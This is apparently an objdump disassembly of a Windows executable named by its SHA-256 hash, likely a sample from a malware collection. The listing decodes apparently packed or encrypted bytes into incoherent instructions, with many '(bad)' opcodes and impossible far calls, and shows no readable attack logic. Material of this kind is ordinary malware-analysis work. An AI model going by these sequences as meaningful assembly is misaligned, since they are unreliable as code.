
7236a68b8d74570789ac33085b6e4442dc7baea15135aedc9953c532a6fe7c0a.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	cwde   
  411001:	inc    esp
  411002:	pop    esp
  411003:	in     eax,dx
  411004:	sub    DWORD PTR [ebx-0x1f],ebp
  411007:	mov    edx,ds
  411009:	adc    ah,BYTE PTR ds:0x3c18f33b
  41100f:	add    dl,dl
  411011:	xchg   esp,eax
  411012:	sub    al,0x48
  411014:	(bad)  
  411015:	call   0xc0c3845a
  41101a:	outs   dx,DWORD PTR ds:[esi]
  41101b:	jl     0x411069
  41101d:	sbb    eax,DWORD PTR [ecx-0x62]
  411020:	scas   al,BYTE PTR es:[edi]
  411021:	call   0x264b:0xb2c6ec39
  411028:	mov    esi,0xf8f0961c
  41102d:	leave  
  41102e:	stos   DWORD PTR es:[edi],eax
  41102f:	(bad)  
  411030:	mov    ch,0xcb
  411032:	lds    eax,FWORD PTR [edi]
  411034:	xchg   ebp,eax
  411035:	inc    ebp
  411036:	je     0x411080
  411038:	sbb    DWORD PTR [edx+0x44a32778],ecx
  41103e:	fs call 0x686ab682
  411044:	(bad)
  411048:	jne    0x411065
  41104a:	int3   
  41104b:	mov    esi,0xb541661c
  411050:	add    DWORD PTR [ecx-0x1f],0x8e6e33f3
  411057:	push   es
  411058:	out    dx,eax
  411059:	pop    es
  41105a:	or     DWORD PTR [ebx+0x46],ebp
  41105d:	mov    ebx,ebx
  41105f:	rol    ecx,1
  411061:	pop    edx
  411062:	pop    es
  411063:	in     al,dx
  411064:	and    ah,BYTE PTR [ecx-0x7a]
  411067:	in     al,0xe2
  411069:	dec    edi
  41106a:	push   es
  41106b:	rol    BYTE PTR [edi+0x7bbea59c],cl
  411071:	add    BYTE PTR [ebp+eax*4-0x2ae584fd],0x96
  411079:	pop    edx
  41107a:	mov    bl,0x35
  41107c:	lds    esi,FWORD PTR [ebx]
  41107e:	int3   
  41107f:	mov    esi,0xebb4f727
  411084:	mov    ecx,0x12b5e9f8
  411089:	fcom   DWORD PTR [ebx-0x5d374994]
  41108f:	lods   eax,DWORD PTR ds:[esi]
  411090:	xor    bh,BYTE PTR [eax-0x77]
  411093:	xchg   ah,ch
  411095:	icebp  
  411096:	(bad)  
  411097:	sbb    edx,DWORD PTR [eax-0x31a23706]
  41109d:	into   
  41109e:	aad    0x4a
  4110a0:	dec    edx
  4110a1:	imul   edi,ebp,0x17
  4110a4:	or     eax,0x90d98f8c
  4110a9:	in     al,0x83
  4110ab:	(bad)  
  4110ac:	retf   
  4110ad:	lock sub BYTE PTR [ecx+0x3d6764a],dl
  4110b4:	xchg   edx,eax
  4110b5:	rol    BYTE PTR [esp+eiz*2-0x8],0x96
  4110ba:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110bc:	cwde   
  4110bd:	and    ch,BYTE PTR [edx+0x70]
  4110c0:	xchg   esi,eax
  4110c1:	ins    DWORD PTR es:[edi],dx
  4110c2:	cmp    eax,0x35b28d0a
  4110c7:	lods   eax,DWORD PTR ds:[esi]
  4110c8:	add    edx,esi
  4110ca:	jns    0x4110fa
  4110cc:	mov    dh,0x18
  4110ce:	iret   
  4110cf:	push   esi
  4110d0:	mov    eax,ds:0x6eef707e
  4110d5:	(bad)  [edi-0x33]
  4110d8:	dec    edx
  4110d9:	jg     0x411103
  4110db:	cmp    esp,DWORD PTR [ebx-0x9]
  4110de:	dec    ah
  4110e0:	loope  0x411090
  4110e2:	xchg   edx,eax
  4110e3:	fcomp  DWORD PTR [ebx+0x27]
  4110e6:	sahf   
  4110e7:	mov    WORD PTR [ebp+0x4adf4804],?
  4110ed:	or     DWORD PTR [edx+edi*2],0xa9d6859d
  4110f4:	cdq    
  4110f5:	inc    DWORD PTR ds:0xf7f39368
  4110fb:	pop    edx
  4110fc:	rol    BYTE PTR [esi+0x7f2b13fb],0x5b
  411103:	sbb    eax,0x6ea31a6
  411108:	inc    eax
  411109:	sub    eax,0x860642e5
  41110e:	idiv   DWORD PTR [esi]
  411110:	stos   BYTE PTR es:[edi],al
  411111:	pushf  
  411112:	fdivr  QWORD PTR [edx]
  411114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411115:	mov    ds:0x43996e0d,eax
  41111a:	jmp    0xc9a652a1
  41111f:	inc    ebx
  411120:	retf   0x4153
  411123:	mov    fs,WORD PTR [ebx+ebx*2-0x7a]
  411127:	push   edx
  411128:	add    al,0xcb
  41112a:	jnp    0x4110d4
  41112c:	aaa    
  41112d:	xlat   BYTE PTR ds:[ebx]
  41112e:	pop    eax
  41112f:	ror    dh,cl
  411131:	add    DWORD PTR [ebx+0x19],esp
  411134:	xor    eax,0x19cde1c5
  411139:	lds    edi,FWORD PTR [eax-0x38a8077d]
  41113f:	pop    edx
  411140:	add    eax,DWORD PTR [ebx-0x5c21ac1a]
  411146:	pop    eax
  411147:	fs fucomi st,st(0)
  41114a:	imul   ebp,DWORD PTR [eax+0x51ea37f8],0xfe46017d
  411154:	repz js 0x411107
  411157:	dec    edi
  411158:	jge    0x41116e
  41115a:	out    dx,eax
  41115b:	adc    al,0xec
  41115d:	int    0x3f
  41115f:	std    
  411160:	xor    eax,DWORD PTR [ebp+esi*1+0x10aa5b74]
  411167:	sub    eax,0xc490d593
  41116c:	ins    DWORD PTR es:[edi],dx
  41116d:	cmp    cl,cl
  41116f:	jae    0x411128
  411171:	mov    edi,gs
  411173:	scas   eax,DWORD PTR es:[edi]
  411174:	mov    ecx,0xf9335b1d
  411179:	les    edx,FWORD PTR [ebx+0x463ec45a]
  41117f:	pusha  
  411180:	push   ds
  411181:	cs push esp
  411183:	outs   dx,DWORD PTR ds:[esi]
  411184:	icebp  
  411185:	jbe    0x411121
  411187:	aaa    
  411188:	sub    bl,cl
  41118a:	sti    
  41118b:	(bad)  
  41118c:	out    0x3b,eax
  41118e:	gs cld 
  411190:	enter  0x727d,0xba
  411194:	and    eax,DWORD PTR [eax-0x11f41e8e]
  41119a:	jecxz  0x411137
  41119c:	mov    al,ds:0xf6028f0b
  4111a1:	test   BYTE PTR [ecx-0x42],ch
  4111a4:	popa   
  4111a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111a6:	in     al,dx
  4111a7:	imul   esp,DWORD PTR [ebp-0x2e],0xbf2534e9
  4111ae:	aam    0x76
  4111b0:	jle    0x411202
  4111b2:	pop    edi
  4111b3:	mov    esp,DWORD PTR [ecx]
  4111b5:	les    edi,FWORD PTR [ebx-0x6f]
  4111b8:	fcom   DWORD PTR [edx+edi*2+0x11015ea8]
  4111bf:	mov    ch,0xef
  4111c1:	inc    esi
  4111c2:	stc    
  4111c3:	out    dx,al
  4111c4:	jb     0x411160
  4111c6:	mov    al,0xc4
  4111c8:	mov    esp,0x886c6611
  4111cd:	push   0xe56eedd6
  4111d2:	or     edi,edi
  4111d4:	lahf   
  4111d5:	js     0x411236
  4111d7:	inc    ebp
  4111d8:	xor    DWORD PTR [ecx-0x7fa98ef4],eax
  4111de:	fldenv [edx]
  4111e0:	xor    al,0x68
  4111e2:	jb     0x4111b8
  4111e4:	or     ebp,ebx
  4111e6:	mov    DWORD PTR [ebp+0x39],0x40176172
  4111ed:	adc    al,0x50
  4111ef:	scas   al,BYTE PTR es:[edi]
  4111f0:	xchg   ebx,eax
  4111f1:	jmp    0xc829:0x403f0fea
  4111f8:	fisubr WORD PTR [edi-0x7cb7d073]
  4111fe:	lock loope 0x4111ec
  411201:	test   BYTE PTR [ebx-0x3],cl
  411204:	sub    DWORD PTR [ecx+0x2],ebp
  411207:	xor    eax,0xb5562b40
  41120c:	or     DWORD PTR [ebp-0x23],edi
  41120f:	shl    DWORD PTR [esi-0xd],1
  411212:	add    ch,BYTE PTR [eax+eax*8-0x74]
  411216:	xchg   edi,eax
  411217:	icebp  
  411218:	adc    al,0xa4
  41121a:	ins    BYTE PTR es:[edi],dx
  41121b:	int    0x26
  41121d:	push   ds
  41121e:	sub    eax,0x8be32389
  411223:	jmp    0x4111ce
  411225:	in     eax,dx
  411226:	jns    0x411252
  411228:	jge    0x411254
  41122a:	pop    ecx
  41122b:	mov    ds,WORD PTR [edi-0x55cf1720]
  411231:	xor    eax,0x653f328b
  411236:	ins    DWORD PTR es:[edi],dx
  411237:	addr16 cmp ah,ch
  41123a:	push   edi
  41123b:	jae    0x411230
  41123d:	icebp  
  41123e:	xor    DWORD PTR [ecx-0x4bd8fbc0],edx
  411244:	push   ds
  411245:	pop    edi
  411246:	nop
  411247:	xor    eax,0x92ec472f
  41124c:	and    al,0x3a
  41124e:	mov    ds:0x8952715,eax
  411253:	and    edi,edx
  411255:	retf   
  411256:	dec    edi
  411257:	fdivr  QWORD PTR [eax-0x7b]
  41125a:	pop    eax
  41125b:	adc    al,0x82
  41125d:	mov    ds,WORD PTR [edi+0x51a593ac]
  411263:	xlat   BYTE PTR ds:[ebx]
  411264:	arpl   WORD PTR [esi+0x14],dx
  411267:	jno    0x411267
  411269:	or     edi,DWORD PTR [eax-0x26]
  41126c:	ins    DWORD PTR es:[edi],dx
  41126d:	pop    esi
  41126e:	scas   al,BYTE PTR es:[edi]
  41126f:	mov    bl,0xe5
  411271:	out    dx,al
  411272:	call   0xbe16:0x4a0a74b8
  411279:	ins    DWORD PTR es:[edi],dx
  41127a:	lods   eax,DWORD PTR ds:[esi]
  41127b:	add    eax,0x67492352
  411280:	xor    cl,BYTE PTR [edi+eax*2]
  411283:	jmp    0x41121e
  411285:	jne    0x4112cc
  411287:	(bad)  
  411288:	cwde   
  411289:	clc    
  41128a:	repz fs lahf 
  41128d:	test   eax,0x2c49e430
  411292:	push   es
  411293:	xchg   ecx,eax
  411294:	mov    bh,BYTE PTR [edx]
  411296:	outs   dx,DWORD PTR ds:[esi]
  411297:	mov    ds:0x5fe00afe,al
  41129c:	loop   0x41129a
  41129e:	shl    BYTE PTR [ecx-0xd15161e],cl
  4112a4:	pop    edx
  4112a5:	adc    ah,dl
  4112a7:	retf   
  4112a8:	into   
  4112a9:	popf   
  4112aa:	dec    eax
  4112ab:	int    0x4
  4112ad:	ficomp DWORD PTR [ebp+0x2ebab275]
  4112b3:	cmp    DWORD PTR [ebx],esi
  4112b5:	mov    DWORD PTR [ebp+esi*4-0x45],eax
  4112b9:	or     esi,DWORD PTR [edx]
  4112bb:	adc    cl,ah
  4112bd:	pop    ecx
  4112be:	cdq    
  4112bf:	jmp    0x98e9c13a
  4112c4:	aaa    
  4112c5:	mov    ebp,0x52b47ac7
  4112ca:	sbb    ch,BYTE PTR [esi+0x5b62c536]
  4112d0:	adc    dl,cl
  4112d2:	jle    0x4112fa
  4112d4:	inc    edi
  4112d5:	out    0xae,al
  4112d7:	or     cl,BYTE PTR [ebx+0x6]
  4112da:	dec    eax
  4112db:	ds pusha 
  4112dd:	adc    al,0xc6
  4112df:	cmp    ch,dh
  4112e1:	mov    ch,0x75
  4112e3:	in     al,0x9c
  4112e5:	pushf  
  4112e6:	push   esi
  4112e7:	pop    ebp
  4112e8:	add    BYTE PTR [ecx],bl
  4112ea:	xchg   edx,eax
  4112eb:	cmp    al,0xde
  4112ed:	lods   al,BYTE PTR ds:[esi]
  4112ee:	mov    edi,0x8e600d94
  4112f3:	in     eax,dx
  4112f4:	sbb    DWORD PTR [ebp+0x47],edi
  4112f7:	test   BYTE PTR [eax+0x2fbf11fd],dl
  4112fd:	dec    edi
  4112fe:	push   0xfffffff6
  411300:	pop    DWORD PTR [esi-0x1adeeef0]
  411306:	pop    ecx
  411307:	lahf   
  411308:	and    esp,ebx
  41130a:	in     eax,0xf3
  41130c:	sbb    DWORD PTR [ebp+0x52],0xffffff9f
  411310:	inc    ebp
  411311:	shl    DWORD PTR [ecx],0x4c
  411314:	nop
  411315:	push   esp
  411316:	mov    ah,0xaf
  411318:	iret   
  411319:	xlat   BYTE PTR ds:[ebx]
  41131a:	aaa    
  41131b:	jmp    FWORD PTR [ebx-0x1277bcc4]
  411321:	add    eax,0xc023093e
  411326:	call   0xfff8:0x313830f4
  41132d:	push   ss
  41132e:	repnz or dh,BYTE PTR [ecx+0x7]
  411332:	ds cmp eax,ebx
  411335:	xchg   edi,eax
  411336:	push   edi
  411337:	retf   0xc0c4
  41133a:	(bad)  
  41133b:	retf   0xcbd4
  41133e:	out    dx,eax
  41133f:	sbb    BYTE PTR [eax],al
  411341:	pop    edi
  411342:	call   0x441b:0x4551a19b
  411349:	sub    DWORD PTR [ebx],edx
  41134b:	shl    ebx,1
  41134d:	jbe    0x4112eb
  41134f:	ret    
  411350:	dec    ebp
  411351:	mov    dh,0xe1
  411353:	and    DWORD PTR [ecx],ebx
  411355:	mov    al,0xa1
  411357:	ins    DWORD PTR es:[edi],dx
  411358:	jecxz  0x41133b
  41135a:	dec    esi
  41135b:	push   es
  41135c:	fldcw  WORD PTR [eax+eax*2]
  41135f:	lea    edx,[ebp-0x3e7bea74]
  411365:	sbb    al,0xa4
  411367:	jae    0x411377
  411369:	xchg   edx,eax
  41136a:	(bad)  
  41136b:	fcomp  QWORD PTR [esi+0x2b]
  41136e:	loope  0x4113c9
  411370:	mov    edi,0xab81a4fd
  411375:	inc    edx
  411376:	pop    eax
  411377:	mov    DWORD PTR [esi],esi
  411379:	lods   eax,DWORD PTR ds:[esi]
  41137a:	mov    eax,ds:0xd344b3c1
  41137f:	and    bl,BYTE PTR [ecx-0x55]
  411382:	add    edx,0x64
  411385:	cmp    al,BYTE PTR [eax-0x4a]
  411388:	jno    0x4113a5
  41138a:	repz jmp 0xb774:0x16126696
  411392:	enter  0x314e,0x59
  411396:	loope  0x4113cd
  411398:	and    DWORD PTR [edx+0x7891cd5d],ecx
  41139e:	in     eax,dx
  41139f:	pop    ss
  4113a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113a1:	mov    al,BYTE PTR [esi+0x41]
  4113a4:	sti    
  4113a5:	xchg   ebp,eax
  4113a6:	xchg   esi,eax
  4113a7:	stos   DWORD PTR es:[edi],eax
  4113a8:	ficomp WORD PTR [ebx-0x64f0917d]
  4113ae:	push   0xfe0d9e8e
  4113b3:	mov    ds:0xcb8e127b,al
  4113b8:	iret   
  4113b9:	lahf   
  4113ba:	lock adc ch,dl
  4113bd:	aaa    
  4113be:	in     eax,dx
  4113bf:	stc    
  4113c0:	sbb    esp,ebp
  4113c2:	adc    edi,DWORD PTR [edx+0x69]
  4113c5:	imul   edi,DWORD PTR [eax-0x15a3590f],0x551fa53
  4113cf:	cmp    al,0x6a
  4113d1:	push   edi
  4113d2:	jmp    0x411401
  4113d4:	xchg   ebp,eax
  4113d5:	mov    eax,ds:0x1a81404f
  4113da:	fdiv   st(2),st
  4113dc:	clc    
  4113dd:	add    ch,BYTE PTR [esi-0x43]
  4113e0:	sub    al,0x4b
  4113e2:	addr16 std 
  4113e4:	in     al,dx
  4113e5:	daa    
  4113e6:	loope  0x4113d7
  4113e8:	sbb    dl,al
  4113ea:	outs   dx,BYTE PTR ds:[esi]
  4113eb:	popf   
  4113ec:	mov    ds:0xe630728b,eax
  4113f1:	test   BYTE PTR [ecx],0x3f
  4113f4:	ret    0x1c7
  4113f7:	stos   DWORD PTR es:[edi],eax
  4113f8:	out    dx,eax
  4113f9:	sub    BYTE PTR [ecx-0x337e2198],cl
  4113ff:	sub    BYTE PTR [ebx-0x4bf7fa7c],ah
  411405:	lock call 0x66843496
  41140b:	xor    eax,0x887dfffc
  411410:	mov    ch,0x41
  411412:	mov    cl,0x2c
  411414:	push   ss
  411415:	mov    al,ds:0xfde91a8d
  41141a:	into   
  41141b:	dec    esp
  41141c:	mov    dl,0xf0
  41141e:	ins    BYTE PTR es:[edi],dx
  41141f:	retf   
  411420:	xchg   DWORD PTR [eax+eax*1+0x1],ebx
  411424:	ffreep st(7)
  411426:	ret    
  411427:	scas   eax,DWORD PTR es:[edi]
  411428:	push   ecx
  411429:	pop    esp
  41142a:	mov    BYTE PTR [ebx+eiz*8+0x1b4c9d18],ah
  411431:	jns    0x41140c
  411433:	push   ecx
  411434:	rol    DWORD PTR [ebp-0x176a4ef7],cl
  41143a:	in     eax,dx
  41143b:	lds    ecx,FWORD PTR ds:0x653c4f20
  411441:	imul   eax,DWORD PTR [ecx+ecx*2-0x2e],0x6e
  411446:	mov    dh,0x21
  411448:	aad    0x15
  41144a:	jns    0x41149b
  41144c:	xor    eax,0x45415c12
  411451:	adc    eax,0x27f498b0
  411456:	mov    ah,0xa1
  411458:	mov    dl,0x20
  41145a:	adc    BYTE PTR [eiz*4+0x7c6c398b],al
  411461:	pop    ecx
  411462:	cwde   
  411463:	add    al,0x1f
  411465:	stos   BYTE PTR es:[edi],al
  411466:	std    
  411467:	clc    
  411468:	dec    esp
  411469:	add    eax,0xedc21260
  41146e:	xor    ebp,DWORD PTR [edi+ecx*4]
  411471:	fsubp  st(6),st
  411473:	mov    edi,0x3723caaa
  411478:	pop    ebp
  411479:	cmp    al,0xc0
  41147b:	jo     0x4114f9
  41147d:	sub    eax,0xe03c663c
  411482:	cwde   
  411483:	sub    esi,edi
  411485:	sbb    bl,BYTE PTR [esi+0x68ee29d7]
  41148b:	ret    
  41148c:	push   esi
  41148d:	adc    al,0x29
  41148f:	jp     0x4114de
  411491:	cmp    eax,0x7747f7c8
  411496:	mov    BYTE PTR [ebx-0x7b],dl
  411499:	inc    esp
  41149a:	in     al,0x3d
  41149c:	pop    ebx
  41149d:	sub    bh,BYTE PTR [edx+eiz*8-0x3aab6860]
  4114a4:	leave  
  4114a5:	jno    0x41145d
  4114a7:	and    ecx,DWORD PTR [ecx+0x4aa5cb7a]
  4114ad:	lods   eax,DWORD PTR ds:[esi]
  4114ae:	js     0x4114a1
  4114b0:	scas   eax,DWORD PTR es:[edi]
  4114b1:	daa    
  4114b2:	stc    
  4114b3:	lea    edi,[esi]
  4114b5:	adc    BYTE PTR [eax],bh
  4114b7:	iret   
  4114b8:	retf   
  4114b9:	adc    edi,DWORD PTR [esi+edx*2+0x535e8584]
  4114c0:	aad    0xc8
  4114c2:	addr16 mov ah,0x39
  4114c5:	(bad)  
  4114c6:	xchg   ebp,eax
  4114c7:	mov    ecx,0x8d877175
  4114cc:	lea    eax,[esi+0x5b]
  4114cf:	test   ebx,ecx
  4114d1:	cs xor esp,ecx
  4114d4:	mov    ecx,0xdebeca59
  4114d9:	into   
  4114da:	iret   
  4114db:	xchg   ecx,eax
  4114dc:	enter  0x55e8,0x24
  4114e0:	xchg   ecx,eax
  4114e1:	jl     0x41149b
  4114e3:	out    dx,al
  4114e4:	xchg   edx,eax
  4114e5:	inc    edx
  4114e6:	shr    DWORD PTR [ecx],1
  4114e8:	test   BYTE PTR [ecx+0xe],cl
  4114eb:	in     eax,dx
  4114ec:	jmp    0x4552:0x50963468
  4114f3:	adc    DWORD PTR [ebx+0x6e500958],ecx
  4114f9:	jg     0x4114f9
  4114fb:	lods   eax,DWORD PTR ds:[esi]
  4114fc:	out    0x29,eax
  4114fe:	mov    ebp,0x38a4d071
  411503:	into   
  411504:	xor    DWORD PTR [esi+0x689693cd],edx
  41150a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41150b:	in     eax,0x15
  41150d:	les    edx,FWORD PTR [esp+esi*8]
  411510:	stos   BYTE PTR es:[edi],al
  411511:	pop    ss
  411512:	dec    esi
  411513:	mov    ecx,0x5cfb51b9
  411518:	add    BYTE PTR [edi+esi*2],bl
  41151b:	sahf   
  41151c:	dec    esi
  41151d:	add    esp,DWORD PTR [esi-0x2a]
  411520:	popf   
  411521:	cmp    al,0x94
  411523:	sub    eax,0x511278d8
  411528:	sub    DWORD PTR [ebp+0x307399cb],ecx
  41152e:	and    al,BYTE PTR [ebx-0x41b1ee79]
  411534:	js     0x4114d7
  411536:	shl    BYTE PTR [eax+0x2e6d6006],1
  41153c:	mov    cl,BYTE PTR [ecx-0x64]
  41153f:	pop    esi
  411540:	in     eax,0xf7
  411542:	jp     0x4114e4
  411544:	outs   dx,BYTE PTR ds:[esi]
  411545:	lahf   
  411546:	dec    esp
  411547:	pop    ebx
  411548:	fsubr  st,st(6)
  41154a:	mov    esp,DWORD PTR [edx]
  41154c:	or     esi,DWORD PTR [ecx-0x18]
  41154f:	add    al,0xcf
  411551:	nop
  411552:	mov    al,ds:0xa8fd23a9
  411557:	pushf  
  411558:	cwde   
  411559:	jno    0x41154a
  41155b:	cwde   
  41155c:	jbe    0x4115b9
  41155e:	iret   
  41155f:	dec    ebx
  411560:	addr16 xchg ebx,eax
  411562:	xor    bl,BYTE PTR [ebx]
  411564:	out    0xac,eax
  411566:	fnstcw WORD PTR [eax+edx*8]
  411569:	loope  0x411515
  41156b:	repnz (bad) 
  41156d:	cmp    edx,DWORD PTR [ebp-0x4bb547d6]
  411573:	jb     0x41156d
  411575:	sbb    ah,bh
  411577:	jnp    0x411547
  411579:	ss sub eax,0xdb1b6915
  41157f:	xor    al,BYTE PTR [esi]
  411581:	mov    BYTE PTR [ecx],ah
  411583:	jle    0x41152e
  411585:	mov    DWORD PTR [esi],esp
  411587:	jno    0x4115bf
  411589:	sbb    esp,edi
  41158b:	or     DWORD PTR [ebp-0x921da91],ebp
  411591:	test   DWORD PTR [ebx],ecx
  411593:	icebp  
  411594:	call   0x2742a0a3
  411599:	sbb    DWORD PTR [esi-0x4b],ebp
  41159c:	dec    ebx
  41159d:	cmp    al,0xab
  41159f:	pop    ss
  4115a0:	pop    ebp
  4115a1:	sbb    cl,BYTE PTR [ebx-0x1e]
  4115a4:	mov    ebx,0x76704a9d
  4115a9:	push   0xf27edddd
  4115ae:	cmp    DWORD PTR [ebx+0x35],edi
  4115b1:	stos   DWORD PTR es:[edi],eax
  4115b2:	inc    ebx
  4115b3:	leave  
  4115b4:	sbb    al,0xf9
  4115b6:	mov    ch,BYTE PTR [eax+edx*4+0x6fa5a849]
  4115bd:	jns    0x4115c5
  4115bf:	outs   dx,DWORD PTR ds:[si]
  4115c1:	pop    esi
  4115c2:	push   esi
  4115c3:	pop    esp
  4115c4:	fist   DWORD PTR [ebp+0x6615137e]
  4115ca:	lea    esp,[edi-0x227378b5]
  4115d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115d1:	mov    ds:0xd32c716d,eax
  4115d6:	mov    eax,DWORD PTR [eax]
  4115d8:	call   0xa620:0xc233edd9
  4115df:	sbb    edi,DWORD PTR [ecx-0x23]
  4115e2:	pop    ds
  4115e3:	inc    edx
  4115e4:	sbb    BYTE PTR [ecx-0x2f02f6a7],dh
  4115ea:	pop    es
  4115eb:	ins    DWORD PTR es:[edi],dx
  4115ec:	loope  0x411666
  4115ee:	sub    DWORD PTR [ecx-0x68],esp
  4115f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115f2:	mov    ds:0x8c7a86a2,eax
  4115f7:	loop   0x4115c0
  4115f9:	xchg   DWORD PTR [edi-0x34891375],edi
  4115ff:	out    0x4e,al
  411601:	retf   0xad6c
  411604:	and    DWORD PTR [eax-0x3e],0xffffff97
  411608:	lea    esp,[ebp-0x47]
  41160b:	test   DWORD PTR [esi+0x68c72f4c],ebx
  411611:	inc    eax
  411612:	or     BYTE PTR es:[eax],ch
  411615:	jle    0x411624
  411617:	fst    DWORD PTR [edi-0x4d57fc4]
  41161d:	sar    DWORD PTR [ecx+0x5d],cl
  411620:	loopne 0x411690
  411622:	js     0x411685
  411624:	and    esp,esp
  411626:	out    dx,eax
  411627:	push   ss
  411628:	ds nop
  41162a:	fld    DWORD PTR [edx+esi*8-0x202b4354]
  411631:	dec    eax
  411632:	lods   al,BYTE PTR ds:[esi]
  411633:	test   al,0xeb
  411635:	dec    ebp
  411636:	js     0x411654
  411638:	cdq    
  411639:	(bad)  
  41163a:	sub    DWORD PTR [edi],ebp
  41163c:	ficom  DWORD PTR [eax+0x5d8cdd29]
  411642:	cmp    BYTE PTR [eax+0x5c],0xd
  411646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411647:	sub    DWORD PTR [esi-0x6e2aa8bc],ecx
  41164d:	xchg   edx,eax
  41164e:	and    ch,BYTE PTR [edx]
  411650:	adc    bl,BYTE PTR [ecx+edx*4-0x78]
  411654:	cmp    ch,BYTE PTR [ebp+0x24]
  411657:	and    BYTE PTR [edi],0x92
  41165a:	lods   al,BYTE PTR ds:[esi]
  41165b:	mov    ch,BYTE PTR [esp+ebx*8-0x57a5d0f4]
  411662:	aad    0xa1
  411664:	(bad)  
  411665:	xchg   edx,eax
  411666:	test   BYTE PTR [eax-0x58],al
  411669:	add    al,0x0
  41166b:	or     DWORD PTR [edx+0x5016a86b],ebp
  411671:	dec    eax
  411672:	cmp    eax,0x710d9b4e
  411677:	jo     0x41168b
  411679:	std    
  41167a:	repz or edi,DWORD PTR ds:0x3fe4e561
  411681:	fld    DWORD PTR [ebp-0x4c]
  411684:	fld    TBYTE PTR [ebx-0x55]
  411687:	mov    BYTE PTR [ebp+0x2dbf85dd],ch
  41168d:	popa   
  41168e:	inc    eax
  41168f:	xlat   BYTE PTR ds:[ebx]
  411690:	loop   0x411701
  411692:	mov    esp,0xa319e31f
  411697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411698:	test   DWORD PTR [esi+0x27],eax
  41169b:	mov    esi,0xed39526c
  4116a0:	iret   
  4116a1:	repnz push cs
  4116a3:	jns    0x4116ec
  4116a5:	xchg   al,ah
  4116a7:	cmp    al,0xc4
  4116a9:	ret    
  4116aa:	and    eax,0x372a006d
  4116af:	mov    WORD PTR [ebx+0x5f],es
  4116b2:	hlt    
  4116b3:	leave  
  4116b4:	mov    eax,ds:0x435405f1
  4116b9:	sub    al,0x52
  4116bb:	(bad)  
  4116bc:	loopne 0x411713
  4116be:	retf   
  4116bf:	hlt    
  4116c0:	dec    ecx
  4116c1:	jne    0x41166d
  4116c3:	out    0x11,eax
  4116c5:	sbb    ah,0x9e
  4116c8:	and    DWORD PTR [ebp+0x5b],ebx
  4116cb:	pop    es
  4116cc:	mov    edi,0x7cd9c35b
  4116d1:	ror    BYTE PTR [ebp-0x6d],1
  4116d4:	mov    ebp,0x147ab496
  4116d9:	retf   0xb1fa
  4116dc:	call   0xeb1297fa
  4116e1:	dec    ebp
  4116e2:	mov    al,ds:0xd5a09b75
  4116e7:	jmp    0xb232:0x6409ae61
  4116ee:	mov    WORD PTR [edx-0x4f],?
  4116f1:	mov    al,BYTE PTR [eax-0x73d2675d]
  4116f7:	add    DWORD PTR ds:0x2848ffaf,edx
  4116fd:	and    dl,BYTE PTR [ebp-0x561149de]
  411703:	sbb    BYTE PTR [ebp+0x7fad4894],bh
  411709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41170a:	test   dl,dh
  41170c:	mov    cs,eax
  41170e:	(bad)  
  41170f:	adc    ah,BYTE PTR [ebx]
  411711:	leave  
  411712:	adc    DWORD PTR [esi+0x34],ebx
  411715:	cld    
  411716:	ins    BYTE PTR es:[edi],dx
  411717:	pop    edi
  411718:	mov    WORD PTR [ebx-0x361fe5fe],?
  41171e:	stc    
  41171f:	(bad)  
  411720:	jp     0x411771
  411722:	and    al,0x50
  411724:	cs and eax,0xdd7779f2
  41172a:	mov    al,BYTE PTR [esi+0x8]
  41172d:	pop    ss
  41172e:	stos   BYTE PTR es:[edi],al
  41172f:	xor    bh,BYTE PTR [ebp-0x1a]
  411732:	jle    0x4117b0
  411734:	out    dx,al
  411735:	dec    esi
  411736:	jmp    0xc6c2:0xb05a129d
  41173d:	in     eax,0x7b
  41173f:	xor    DWORD PTR [edi+0x2fb952f3],esi
  411745:	shl    DWORD PTR [edx],cl
  411747:	out    0x28,al
  411749:	daa    
  41174a:	mov    esp,0x5a15d217
  41174f:	mov    ds:0x6f906e,al
  411754:	(bad)  
  411755:	xchg   esp,eax
  411756:	clc    
  411757:	aas    
  411758:	xor    bl,BYTE PTR [ebp+edx*2+0x26]
  41175c:	in     eax,0x80
  41175e:	(bad)  
  41175f:	pop    ebx
  411760:	cmp    eax,DWORD PTR [eax-0x38258a56]
  411766:	mov    WORD PTR [edx+0x420270d7],es
  41176c:	jb     0x41172d
  41176e:	cmp    ebp,edi
  411770:	sub    bh,dl
  411772:	popa   
  411773:	mov    esi,0x7814a5ac
  411778:	loopne 0x411713
  41177a:	imul   edi,DWORD PTR [edx+0x2f01b945],0x4d
  411781:	es jo  0x411718
  411784:	rol    esi,1
  411786:	in     eax,0x8
  411788:	fdiv   QWORD PTR [esi-0xc6857ec]
  41178e:	inc    ebp
  41178f:	bound  eax,QWORD PTR [ebx-0x60b81447]
  411795:	call   0xaf1bf282
  41179a:	dec    ecx
  41179b:	adc    bl,cl
  41179d:	dec    edi
  41179e:	push   ebp
  41179f:	sbb    DWORD PTR [ebx],ebx
  4117a1:	inc    esi
  4117a2:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117a4:	pop    es
  4117a5:	std    
  4117a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117a7:	adc    BYTE PTR [eax],dh
  4117a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117aa:	outs   dx,BYTE PTR ds:[esi]
  4117ab:	inc    esi
  4117ac:	cwde   
  4117ad:	jle    0x411759
  4117af:	or     esp,DWORD PTR [ebp+0x1d43c0c2]
  4117b5:	outs   dx,DWORD PTR ds:[esi]
  4117b6:	stc    
  4117b7:	jmp    0x8627:0x141cf221
  4117be:	or     eax,0xf71c7744
  4117c3:	adc    BYTE PTR gs:0xd52e4005,0x6
  4117cb:	in     al,0x0
  4117cd:	fcom   DWORD PTR [ebx]
  4117cf:	mov    al,ds:0x532787f3
  4117d4:	jnp    0x4117a7
  4117d6:	lea    eax,[esi]
